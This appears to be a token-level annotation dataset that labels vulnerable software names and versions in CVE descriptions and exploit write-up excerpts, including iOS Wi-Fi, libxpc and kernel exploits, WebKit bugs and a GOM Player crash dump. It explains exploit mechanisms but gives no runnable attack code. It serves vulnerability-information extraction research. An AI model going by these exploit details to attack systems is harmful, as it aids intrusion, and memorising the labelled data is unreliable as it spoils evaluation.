shut O O
down O O
through O O
its O O
normal O O
closing O O
protocol O O
. O O

This O O
attack O O
is O O
not O O
considered O O
to O O
be O O
remotely O O
exploitable O O
. O O

This O O
vulnerability O O
has O O
no O O
effect O O
on O O
the O O
operation O O
of O O
the O O
protection O O
relay O O
to O O
which O O
VAMPSET O O
is O O
connected O O
. O O

Memory O O
Corruption O O
Vulnerability O O
in O O
Foxit S-vulnerable_software pair_0
PDF S-vulnerable_software pair_0
Toolkit S-vulnerable_software pair_0
before S-vulnerable_version pair_0
2.1 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
cause O O
Denial O O
of O O
Service O O
& O O
Remote O O
Code O O
Execution O O
when O O
a O O
victim O O
opens O O
a O O
specially O O
crafted O O
PDF O O
file O O
. O O

The O O
issue O O
involves O O
the O O
IOAcceleratorFamily O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
a O O
crafted O O
Mach-O O O
file O O
. O O

Xcode S-vulnerable_software pair_0
before S-vulnerable_version pair_0
9 S-vulnerable_version pair_0
is O O
affected O O
. O O

The O O
issue O O
involves O O
the O O
ld64 O O
component O O
. O O

Safari S-vulnerable_software pair_0
before S-vulnerable_version pair_0
11 S-vulnerable_version pair_0
is O O
affected O O
. O O

tvOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
11 S-vulnerable_version pair_0
is O O
affected O O
. O O

iCloud S-vulnerable_software pair_0
before S-vulnerable_version pair_0
7.0 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

iTunes S-vulnerable_software pair_0
before S-vulnerable_version pair_0
12.7 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

iOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
11 S-vulnerable_version pair_0
is O O
affected O O
. O O

The O O
issue O O
involves O O
the O O
Wi-Fi O O
component O O
. O O

It O O
might O O
allow O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
in O O
a O O
privileged O O
context O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
crafted O O
Wi-Fi O O
traffic O O
that O O
leverages O O
a O O
race O O
condition O O
. O O

Moreover O O
, O O
this O O
version O O
of O O
hostapd O O
is O O
instrumented O O
to O O
add O O
various O O
commands O O
, O O
allowing O O
injection O O
and O O
reception O O
of O O
crafted O O
action O O
frames O O
used O O
throughout O O
the O O
exploit O O
. O O

This O O
version O O
of O O
hostapd O O
is O O
configured O O
to O O
support O O
802.11k O O
RRM O O
, O O
and O O
in O O
particular O O
Neighbor O O
Reports O O
. O O

To O O
run O O
the O O
exploit O O
against O O
different O O
devices O O
or O O
versions O O
, O O
the O O
symbols O O
must O O
be O O
adjusted O O
. O O

The O O
attached O O
archive O O
contains O O
the O O
following O O
directories O O
: O O
-hostapd-2.6 O O
- O O
A O O
modified O O
version O O
of O O
hostapd O O
utilised O O
in O O
the O O
exploit O O
. O O

-OneRing O O
- O O
The O O
exploit O O
itself O O
. O O

You O O
can O O
utilise O O
this O O
R/W O O
access O O
by O O
calling O O
the O O
read_host_dword O O
and O O
write_host_dword O O
functions O O
, O O
respectively O O
. O O

This O O
exploit O O
has O O
been O O
tested O O
on O O
the O O
iPhone S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
, O O
iOS S-vulnerable_software pair_1
10.2 S-vulnerable_version pair_1
( O O
14C92 S-vulnerable_version pair_1
) O O
. O O

Apple S-vulnerable_software pair_0
iOS S-vulnerable_software pair_0
10.2 S-vulnerable_version pair_0
( O O
14C92 O O
) O O
- O O
Remote O O
Code O O
Execution O O

watchOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
4 S-vulnerable_version pair_0
is O O
affected O O
. O O

macOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.13 S-vulnerable_version pair_0
is O O
affected O O
. O O

It O O
might O O
allow O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
in O O
a O O
privileged O O
context O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
crafted O O
Wi-Fi O O
traffic O O
. O O

The O O
issue O O
involves O O
the O O
Mail O O
MessageUI O O
component O O
. O O

It O O
allows O O
attackers O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
image O O
. O O

The O O
issue O O
involves O O
the O O
IOFireWireFamily O O
component O O
. O O

iOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.3.3 S-vulnerable_version pair_0
is O O
affected O O
. O O

watchOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
3.2.3 S-vulnerable_version pair_0
is O O
affected O O
. O O

tvOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.2.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

macOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.12.6 S-vulnerable_version pair_0
is O O
affected O O
. O O

iCloud S-vulnerable_software pair_0
before S-vulnerable_version pair_0
6.2.2 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

iTunes S-vulnerable_software pair_0
before S-vulnerable_version pair_0
12.6.2 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

Safari S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.1.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

So O O
in O O
this O O
case O O
the O O
condition O O
is O O
not O O
satisfied O O
, O O
the O O
arguments O O
object O O
created O O
by O O
the O O
following O O
code O O
( O O
CreateDirectArguments O O
in O O
the O O
PoC O O
) O O
may O O
have O O
uninitialized O O
values O O
and O O
length O O
. O O

The O O
issue O O
involves O O
the O O
Bluetooth O O
component O O
. O O

The O O
issue O O
involves O O
the O O
libxpc O O
component O O
. O O

That O O
bplist16 O O
buffer O O
gets O O
sent O O
in O O
an O O
xpc O O
message O O
as O O
an O O
xpc_data O O
object O O
. O O

This O O
is O O
a O O
race O O
condition O O
so O O
you O O
may O O
have O O
to O O
run O O
the O O
PoC O O
multiple O O
times O O
( O O
./run.sh O O
) O O
and O O
also O O
use O O
libgmalloc O O
to O O
see O O
the O O
corruption O O
directly O O
rather O O
than O O
its O O
effects O O
. O O

The O O
most O O
direct O O
path O O
to O O
trigger O O
memory O O
controlled O O
memory O O
corruption O O
is O O
to O O
use O O
a O O
type O O
signature O O
like O O
this O O
: O O
@ O O
ABCD O O
That O O
will O O
cause O O
7 O O
bytes O O
of O O
buffer O O
space O O
to O O
be O O
allocated O O
for O O
the O O
parsed O O
signature O O
( O O
which O O
will O O
just O O
contain O O
a O O
copy O O
of O O
the O O
string O O
. O O
) O O

NSXPC O O
is O O
widely O O
used O O
across O O
privilege O O
boundaries O O
. O O

In O O
this O O
PoC O O
I O O
target O O
NSXPC O O
, O O
a O O
high-level O O
RPC O O
mechanism O O
which O O
uses O O
XPC O O
for O O
its O O
low-level O O
transport O O
layer O O
. O O

If O O
we O O
change O O
the O O
types O O
represented O O
by O O
the O O
signature O O
string O O
( O O
which O O
is O O
in O O
shared O O
memory O O
) O O
between O O
these O O
two O O
calls O O
we O O
can O O
cause O O
the O O
parsing O O
code O O
to O O
write O O
out O O
of O O
bounds O O
as O O
it O O
assumes O O
that O O
the O O
length O O
computed O O
by O O
NSGetSizeAndAlignment O O
is O O
correct O O
. O O

NSXPCDecoder O O
is O O
implemented O O
in O O
Foundation O O
. O O

This O O
method O O
is O O
implemented O O
in O O
CoreFoundation O O
. O O

This O O
function O O
calls O O
NSGetSizeAndAlignment O O
to O O
determine O O
the O O
size O O
of O O
a O O
buffer O O
required O O
to O O
parse O O
the O O
signature O O
string O O
which O O
NSMS1 O O
then O O
allocates O O
using O O
calloc O O
before O O
parsing O O
the O O
signature O O
string O O
into O O
the O O
allocated O O
buffer O O
. O O

You O O
should O O
just O O
hard O O
reboot O O
the O O
device O O
and O O
try O O
again O O
. O O

This O O
project O O
exploits O O
CVE-2017-7047 O O
to O O
build O O
a O O
proof-of-concept O O
remote O O
lldb O O
debugserver O O
stub O O
capable O O
of O O
attaching O O
to O O
and O O
allowing O O
the O O
remote O O
debugging O O
all O O
userspace O O
processes O O
on O O
iOS S-vulnerable_software pair_0
10.0 S-vulnerable_version pair_0
to S-vulnerable_version pair_0
10.3.2 S-vulnerable_version pair_0
. O O

Please O O
see O O
the O O
README O O
in O O
the O O
nsxpc2pc O O
folder O O
in O O
the O O
attached O O
archive O O
for O O
further O O
discussion O O
and O O
details O O
. O O

This O O
PoC O O
targets O O
the O O
airportd O O
daemon O O
which O O
runs O O
as O O
root O O
but O O
should O O
work O O
for O O
any O O
NSXPC O O
service O O
. O O

If O O
you O O
take O O
a O O
look O O
at O O
the O O
xcode O O
stdout/debugger O O
window O O
you O O
can O O
see O O
some O O
more O O
status O O
information O O
. O O

Clients O O
send O O
serialized O O
NSInvocation O O
objects O O
representing O O
the O O
methods O O
they O O
wish O O
to O O
call O O
on O O
the O O
remote O O
objects O O
. O O

NSXPCDecoder O O
wraps O O
the O O
bplist16 O O
deserialization O O
and O O
for O O
selectors O O
such O O
as O O
decodeCStringForKey O O
: O O
, O O
if O O
the O O
key O O
is O O
present O O
, O O
the O O
value O O
returned O O
will O O
be O O
a O O
pointer O O
directly O O
into O O
the O O
xpc_data O O
object O O
in O O
which O O
it O O
was O O
received O O
. O O

It O O
may O O
take O O
a O O
couple O O
of O O
attempts O O
but O O
it O O
should O O
work O O
. O O

Consumers O O
of O O
xpc O O
messages O O
did O O
not O O
seem O O
to O O
expect O O
that O O
the O O
backing O O
buffers O O
of O O
xpc_data O O
objects O O
could O O
be O O
modified O O
by O O
the O O
sender O O
whilst O O
being O O
processed O O
by O O
the O O
receiver O O
. O O

Once O O
the O O
debugserver O O
is O O
running O O
it O O
should O O
be O O
stable O O
. O O

By O O
crafting O O
our O O
own O O
memory O O
entry O O
object O O
this O O
means O O
the O O
pointers O O
returned O O
by O O
decodeCStringForKey O O
: O O
actually O O
point O O
into O O
shared O O
memory O O
which O O
can O O
still O O
be O O
modified O O
by O O
the O O
caller O O
. O O

These O O
NSInvocations O O
are O O
serialized O O
using O O
the O O
NSSecureCoding O O
method O O
which O O
ends O O
up O O
creating O O
a O O
bplist16 O O
serialized O O
byte O O
stream O O
. O O

triple_fetch O O
- O O
ianbeer O O
This O O
is O O
an O O
exploit O O
for O O
CVE-2017-7047 O O
, O O
a O O
logic O O
error O O
in O O
libxpc O O
which O O
allowed O O
malicious O O
message O O
senders O O
to O O
send O O
xpc_data O O
objects O O
that O O
were O O
backed O O
by O O
shared O O
memory O O
. O O

So O O
JSDOMWindow O O
: O O
:getPrototype O O
which O O
checks O O
the O O
Same O O
Origin O O
Policy O O
is O O
not O O
called O O
. O O

The O O
issue O O
involves O O
the O O
Foundation O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
a O O
crafted O O
file O O
. O O

The O O
issue O O
involves O O
the O O
AppleGraphicsPowerManagement O O
component O O
. O O

The O O
issue O O
involves O O
the O O
WebKit O O
Page O O
Loading O O
component O O
. O O

void O O
flush O O
( O O
InlineStackEntry O O
inlineStackEntry O O
if O O
( O O
m_graph.needsScopeRegister O O
( O O
) O O
) O O
flush O O
( O O
m_codeBlock- O O
> O O
scopeRegister O O
( O O
) O O
) O O
; O O
( O O
a O O
) O O
} O O
At O O
( O O
a O O
) O O
, O O
it O O
should O O
flush O O
the O O
scope O O
register O O
of O O
|inlineStackEntry- O O
> O O
m_codeBlock| O O
instead O O
of O O
|m_codeBlock| O O
. O O

As O O
a O O
result O O
, O O
the O O
scope O O
register O O
of O O
|inlineStackEntry- O O
> O O
m_codeBlock| O O
may O O
have O O
an O O
incorrect O O
offset O O
in O O
the O O
stack O O
layout O O
phase O O
. O O

The O O
issue O O
involves O O
the O O
afclip O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
a O O
crafted O O
audio O O
file O O
. O O

The O O
issue O O
involves O O
the O O
Audio O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
obtain O O
sensitive O O
information O O
from O O
process O O
memory O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
audio O O
file O O
. O O

The O O
issue O O
involves O O
the O O
WebKit O O
Web O O
Inspector O O
component O O
. O O

The O O
issue O O
involves O O
the O O
IOUSBFamily O O
component O O
. O O

The O O
issue O O
involves O O
the O O
CoreAudio O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
a O O
crafted O O
movie O O
file O O
. O O

iOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.3.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

The O O
issue O O
involves O O
the O O
AVEVideoEncoder O O
component O O
. O O

tvOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.2.1 S-vulnerable_version pair_0
is O O
affected O O
. O O

watchOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
3.2.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

Sources O O
: O O
iOS S-vulnerable_software pair_0
kernel O O
exploit O O
designated O O
to O O
work O O
on O O
all O O
64-bit O O
iOS O O
devices O O
< S-vulnerable_version pair_0
= S-vulnerable_version pair_0
10.3.1 S-vulnerable_version pair_0
More O O
general O O
information O O
modifications O O
for O O
other O O
iOS O O
devices O O
Like O O
a O O
lot O O
( O O
if O O
not O O
most O O
) O O
of O O
the O O
iOS O O
kernel O O
exploits O O
, O O
this O O
also O O
requires O O
offsets O O
for O O
each O O
iOS O O
device O O
and O O
version O O
. O O

This O O
is O O
a O O
crucial O O
part O O
in O O
a O O
Jailbreak O O
chain O O
, O O
but O O
this O O
never O O
aimed O O
to O O
become O O
a O O
Jailbreak O O
. O O

Is O O
it O O
a O O
Jailbreak O O

Is O O
this O O
going O O
to O O
be O O
a O O
jailbreak O O

Fortunately O O
, O O
Sandbox O O
escape O O
exploits O O
have O O
been O O
released O O
by O O
P0 O O
, O O
which O O
means O O
this O O
can O O
be O O
used O O
to O O
completely O O
compromise O O
a O O
kernel O O
, O O
and O O
a O O
step O O
towards O O
a O O
full O O
jailbreak O O
. O O

Maybe O O
, O O
if O O
someone O O
wants O O
to O O
work O O
on O O
that O O
Credits O O
Credit O O
for O O
finding O O
the O O
vulnerabilities O O
, O O
chaining O O
them O O
together O O
, O O
writing O O
the O O
exploit O O
go O O
to O O
Adam O O
Donenfeld O O
( O O
@ O O
doadam O O
) O O
. O O

Those O O
will O O
be O O
posted O O
in O O
the O O
close O O
future O O
( O O
when O O
I O O
get O O
more O O
time O O
) O O
but O O
should O O
be O O
acquired O O
from O O
AppleAVEDriver O O
( O O
you O O
can O O
get O O
a O O
hint O O
on O O
the O O
offsets O O
from O O
the O O
comments O O
above O O
them O O
) O O
. O O

Sandbox O O
escape O O
Like O O
mentioned O O
, O O
AppleAVEDriver O O
direct O O
access O O
requires O O
sandbox O O
escape O O
( O O
either O O
mediaserverd O O
sandbox O O
context O O
or O O
no O O
sandbox O O
at O O
all O O
) O O
. O O

Special O O
thanks O O
to O O
Zuk O O
Avraham O O
( O O
@ O O
ihackbanme O O
) O O
, O O
Yaniv O O
Karta O O
( O O
@ O O
shokoluv O O
) O O
and O O
the O O
rest O O
of O O
the O O
Zimperium O O
team O O
for O O
the O O
opportunity O O
( O O
and O O
the O O
paycheck O O
) O O
. O O

Apple S-vulnerable_software pair_0
iOS S-vulnerable_software pair_0
< S-vulnerable_version pair_0
10.3.1 S-vulnerable_version pair_0
- O O
Kernel O O

macOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.12.5 S-vulnerable_version pair_0
is O O
affected O O
. O O

The O O
issue O O
involves O O
the O O
SQLite O O
component O O
. O O

It O O
allows O O
attackers O O
to O O
conduct O O
sandbox-escape O O
attacks O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
app O O
. O O

The O O
issue O O
involves O O
the O O
iBooks O O
component O O
. O O

The O O
issue O O
involves O O
the O O
NVIDIA O O
Graphics O O
Drivers O O
component O O
. O O

iTunes S-vulnerable_software pair_0
before S-vulnerable_version pair_0
12.6.1 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

Safari S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.1.1 S-vulnerable_version pair_0
is O O
affected O O
. O O

inline O O
Butterfly O O
tryCreateArrayButterfly O O
( O O
VM O O
& O O
vm O O
, O O
JSCell O O
intendedOwner O O
, O O
unsigned O O
initialLength O O
) O O
{ O O
Butterfly O O
butterfly O O
= O O
Butterfly O O
: O O
:tryCreate O O
( O O
vm O O
, O O
intendedOwner O O
, O O
0 O O
, O O
0 O O
, O O
true O O
, O O
baseIndexingHeaderForArrayStorage O O
( O O
initialLength O O
) O O
, O O
ArrayStorage O O
: O O
:sizeFor O O
( O O
BASE_ARRAY_STORAGE_VECTOR_LEN O O
) O O
) O O
; O O
if O O
( O O
! O O
butterfly O O
) O O
return O O
nullptr O O
; O O
ArrayStorage O O
storage O O
= O O
butterfly- O O
> O O
arrayStorage O O
( O O
) O O
; O O
storage- O O
> O O
m_sparseMap.clear O O
( O O
) O O
; O O
storage- O O
> O O
m_indexBias O O
= O O
0 O O
; O O
storage- O O
> O O
m_numValuesInVector O O
= O O
0 O O
; O O
return O O
butterfly O O
; O O
} O O
It O O
allocates O O
a O O
fixed O O
size O O
( O O
BASE_ARRAY_STORAGE_VECTOR_LEN O O
) O O
of O O
memory O O
without O O
caring O O
about O O
|initialLength| O O
. O O

So O O
a O O
BOF O O
occurs O O
in O O
the O O
following O O
iteration O O
. O O

So O O
the O O
next O O
routine O O
must O O
clear O O
its O O
all O O
indices O O
. O O

But O O
the O O
routine O O
skips O O
holes O O
in O O
|thisObj| O O
. O O

WebKit O O
JSC O O
- O O
arrayProtoFuncSplice O O
does O O
not O O
Initialize O O
all O O
Indices O O

The O O
issue O O
involves O O
the O O
Speech O O
Framework O O
component O O
. O O

A O O
boundary O O
error O O
within O O
the O O
parse_tiff_ifd O O
( O O
) O O
function O O
( O O
internal/dcraw_common.cpp O O
) O O
in O O
LibRaw S-vulnerable_software pair_0
versions O O
before S-vulnerable_version pair_0
0.18.2 S-vulnerable_version pair_0
can O O
be O O
exploited O O
to O O
cause O O
a O O
memory O O
corruption O O
via O O
e.g O O
. O O

a O O
specially O O
crafted O O
KDC O O
file O O
with O O
model O O
set O O
to O O
DSLR-A100 O O
and O O
containing O O
multiple O O
sequences O O
of O O
0x100 O O
and O O
0x14A O O
TAGs O O
. O O

The O O
parse_string_node O O
function O O
in O O
bplist.c O O
in O O
libimobiledevice O O
libplist S-vulnerable_software pair_0
1.12 S-vulnerable_version pair_0
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
plist O O
file O O
. O O

GOM S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
2.3.10.5266 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
via O O
a O O
crafted O O
fpx O O
file O O
. O O

Exploit O O
Title O O
: O O
GOM S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
2.3.10.5266 S-vulnerable_version pair_0
- O O
Remote O O
heap O O
corruption O O
( O O
.fpx O O
) O O
Date O O
: O O
2017-02-15 O O
Exploit O O
Author O O
: O O
Peter O O
Baris O O
Exploit O O
link O O
: O O
Software O O
Link O O
: O O
CVE O O
: O O
CVE-2017-5881 O O
Version O O
: O O
2.3.10.5266 O O

eax=092fcde8 O O
ebx=00000000 O O
ecx=41414141 O O
edx=090ff798 O O
esi=090ff790 O O
edi=05b10000 O O
eip=77902fe5 O O
esp=10a9fbb4 O O
ebp=10a9fc94 O O
iopl=0 O O
nv O O
up O O
ei O O
ng O O
nz O O
na O O
pe O O
cy O O
cs=0023 O O
ss=002b O O
ds=002b O O
es=002b O O
fs=0053 O O
gs=002b O O
efl=00010287 O O
ntdll O O
! O O
RtlpFreeHeap+0x4d6 O O
: O O
77902fe5 O O
8b19 O O
mov O O
ebx O O
, O O
dword O O
ptr O O
[ O O
ecx O O
] O O
ds:002b:41414141 O O

GOM S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
2.3.10.5266 S-vulnerable_version pair_0
- O O
.fpx O O
Denial O O
of O O
Service O O

drivers/net/ieee802154/atusb.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.9.6 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

[ O O
] O O
Not O O
to O O
mention O O
the O O
bugs O O
introduced O O
via O O
fixes O O
for O O
VMAP_STACK O O
: O O
Use O O
CVE-2017-5549 O O
. O O

) O O
: O O
Use O O
CVE-2017-5550 O O
. O O

[ O O
] O O
Use O O
CVE-2016-10154 O O
. O O

since O O
VMAP_STACK O O
was O O
introduced O O
haphazardly O O
in O O
4.9 O O
without O O
doing O O
any O O
static O O
analysis O O
beyond O O
a O O
simple O O
grep O O
or O O
smatch O O
it O O
seems O O
, O O
there O O
are O O
probably O O
a O O
dozen O O
or O O
so O O
DoSes O O
when O O
CONFIG_DEBUG_SG O O
or O O
CONFIG_DEBUG_VIRTUAL O O
is O O
enabled O O
, O O
or O O
potential O O
silent O O
or O O
not O O
so O O
silent O O
memory O O
corruption O O
when O O
it O O
not O O
, O O
as O O
a O O
scatterlist O O
crossing O O
a O O
virtual O O
page O O
boundary O O
will O O
then O O
end O O
up O O
accessing O O
a O O
totally O O
unrelated O O
adjacent O O
physical O O
page O O
if O O
a O O
stack O O
address O O
was O O
passed O O
into O O
the O O
scatterlist O O
, O O
and O O
these O O
vulnerabilities O O
will O O
continue O O
to O O
pop O O
up O O
until O O
something O O
comprehensive O O
is O O
done O O
to O O
prevent O O
them O O
. O O

[ O O
] O O
Or O O
this O O
( O O
sgid O O
bit O O
not O O
cleared O O
on O O
tmpfs O O
) O O
: O O
Use O O
CVE-2017-5551 O O
. O O

[ O O
] O O
Use O O
CVE-2016-10153 O O
. O O

[ O O
] O O
0day O O
alert O O
, O O
not O O
fixed O O
in O O
4.9 S-vulnerable_version O
yet O O
: O O
Use O O
CVE-2017-5548 O O
. O O

[ O O
] O O
Or O O
how O O
about O O
a O O
CVE O O
for O O
this O O
huge O O
heap O O
infoleak O O
( O O
and O O
while O O
I O O
m O O
at O O
it O O
, O O
congrats O O
to O O
Al O O
for O O
not O O
covering O O
it O O
up O O
for O O
once O O
, O O
maybe O O
he O O
learning O O
! O O

Emese O O
written O O
an O O
IPA O O
GCC O O
plugin O O
to O O
find O O
all O O
the O O
ones O O
you O O
ve O O
missed O O
, O O
so O O
we O O
know O O
there O O
still O O
are O O
many O O
that O O
haven O O
t O O
been O O
fixed O O
. O O

[ O O
] O O
Use O O
CVE-2017-5547 O O
. O O

Subject O O
: O O
Re O O
: O O
CVE O O
REQUEST O O
: O O
linux O O
kernel O O
: O O
process O O
with O O
pgid O O
zero O O
able O O
to O O
crash O O
kernel O O

drivers/hid/hid-corsair.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.9.6 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

Integer O O
overflow O O
in O O
the O O
wrestool O O
program O O
in O O
icoutils S-vulnerable_software pair_0
before S-vulnerable_version pair_0
0.31.1 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
executable O O
, O O
which O O
triggers O O
a O O
denial O O
of O O
service O O
( O O
application O O
crash O O
) O O
or O O
the O O
possibility O O
of O O
execution O O
of O O
arbitrary O O
code O O
. O O

Subject O O
: O O
Re O O
: O O
CVE O O
Request O O
: O O
icoutils O O
: O O
exploitable O O
crash O O
in O O
wrestool O O
programm O O

Inappropriate O O
use O O
of O O
partition O O
alloc O O
in O O
PDFium O O
in O O
Google S-vulnerable_software pair_0
Chrome S-vulnerable_software pair_0
prior S-vulnerable_version pair_0
to S-vulnerable_version pair_0
61.0.3163.79 S-vulnerable_version pair_0
for O O
Linux O O
, O O
Windows O O
, O O
and O O
Mac O O
, O O
and O O
61.0.3163.81 S-vulnerable_version pair_0
for O O
Android O O
, O O
allowed O O
a O O
remote O O
attacker O O
to O O
potentially O O
exploit O O
memory O O
corruption O O
via O O
a O O
crafted O O
PDF O O
file O O
. O O

An O O
incorrect O O
assumption O O
about O O
block O O
structure O O
in O O
Blink O O
in O O
Google S-vulnerable_software pair_0
Chrome S-vulnerable_software pair_0
prior S-vulnerable_version pair_0
to S-vulnerable_version pair_0
57.0.2987.133 S-vulnerable_version pair_0
for O O
Mac O O
, O O
Windows O O
, O O
and O O
Linux O O
, O O
and O O
57.0.2987.132 S-vulnerable_version pair_0
for O O
Android O O
, O O
allowed O O
a O O
remote O O
attacker O O
to O O
potentially O O
exploit O O
memory O O
corruption O O
via O O
a O O
crafted O O
HTML O O
page O O
that O O
triggers O O
improper O O
casting O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
drawing O O
position O O
definition O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
engine O O
when O O
processing O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
data O O
related O O
to O O
Bezier O O
curves O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
Enhanced O O
Metafile O O
Format O O
( O O
EMF O O
) O O
parser O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
